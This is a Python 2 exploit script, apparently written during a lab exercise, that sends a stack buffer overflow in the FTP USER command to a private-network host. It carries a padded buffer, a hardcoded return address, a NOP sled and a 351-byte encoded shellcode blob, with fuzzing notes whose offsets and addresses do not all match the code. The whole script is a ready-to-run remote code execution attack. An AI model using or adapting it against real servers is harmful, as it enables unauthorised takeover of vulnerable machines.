#!/usr/bin/python
import socket 
# Fuzzing PASS with 9300 bytes
# EIP 386F4337  
# total lenght = "A" * 7495 
# ESP 77591EF2
# \xF2\x1E\x59\x77 - \x03\xB5\x16\x75 
# badchar = \x0a\x0d\x0e\x00
#"C" * 5116 

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

print 'exploit sent'

shellcode = ("\xdd\xc0\xb8\xc1\xad\x12\x1c\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x83\xea\xfc\x31\x42\x13\x03\x83\xbe\xf0\xe9\xff\x29\x76"
"\x11\xff\xa9\x17\x9b\x1a\x98\x17\xff\x6f\x8b\xa7\x8b\x3d\x20"
"\x43\xd9\xd5\xb3\x21\xf6\xda\x74\x8f\x20\xd5\x85\xbc\x11\x74"
"\x06\xbf\x45\x56\x37\x70\x98\x97\x70\x6d\x51\xc5\x29\xf9\xc4"
"\xf9\x5e\xb7\xd4\x72\x2c\x59\x5d\x67\xe5\x58\x4c\x36\x7d\x03"
"\x4e\xb9\x52\x3f\xc7\xa1\xb7\x7a\x91\x5a\x03\xf0\x20\x8a\x5d"
"\xf9\x8f\xf3\x51\x08\xd1\x34\x55\xf3\xa4\x4c\xa5\x8e\xbe\x8b"
"\xd7\x54\x4a\x0f\x7f\x1e\xec\xeb\x81\xf3\x6b\x78\x8d\xb8\xf8"
"\x26\x92\x3f\x2c\x5d\xae\xb4\xd3\xb1\x26\x8e\xf7\x15\x62\x54"
"\x99\x0c\xce\x3b\xa6\x4e\xb1\xe4\x02\x05\x5c\xf0\x3e\x44\x09"
"\x35\x73\x76\xc9\x51\x04\x05\xfb\xfe\xbe\x81\xb7\x77\x19\x56"
"\xb7\xad\xdd\xc8\x46\x4e\x1e\xc1\x8c\x1a\x4e\x79\x24\x23\x05"
"\x79\xc9\xf6\x8a\x29\x65\xa9\x6a\x99\xc5\x19\x03\xf3\xc9\x46"
"\x33\xfc\x03\xef\xde\x07\xc4\xd0\xb7\x06\x07\xb9\xc5\x08\x26"
"\x82\x43\xee\x42\xe4\x05\xb9\xfa\x9d\x0f\x31\x9a\x62\x9a\x3c"
"\x9c\xe9\x29\xc1\x53\x1a\x47\xd1\x04\xea\x12\x8b\x83\xf5\x88"
"\xa3\x48\x67\x57\x33\x06\x94\xc0\x64\x4f\x6a\x19\xe0\x7d\xd5"
"\xb3\x16\x7c\x83\xfc\x92\x5b\x70\x02\x1b\x29\xcc\x20\x0b\xf7"
"\xcd\x6c\x7f\xa7\x9b\x3a\x29\x01\x72\x8d\x83\xdb\x29\x47\x43"
"\x9d\x01\x58\x15\xa2\x4f\x2e\xf9\x13\x26\x77\x06\x9b\xae\x7f"
"\x7f\xc1\x4e\x7f\xaa\x41\x7e\xca\xf6\xe0\x17\x93\x63\xb1\x75"
"\x24\x5e\xf6\x83\xa7\x6a\x87\x77\xb7\x1f\x82\x3c\x7f\xcc\xfe"
"\x2d\xea\xf2\xad\x4e\x3f")  # 351 bytes 

buffer = "A" * 2004 + "\xF2\x1E\x4E\x77" + 90 * "\x90" + shellcode + "C" * 5116

s.connect(('192.168.1.13', 21))

s.recv(1024)

s.send('USER ' + buffer + '\r\n')

s.recv(1024)

s.close()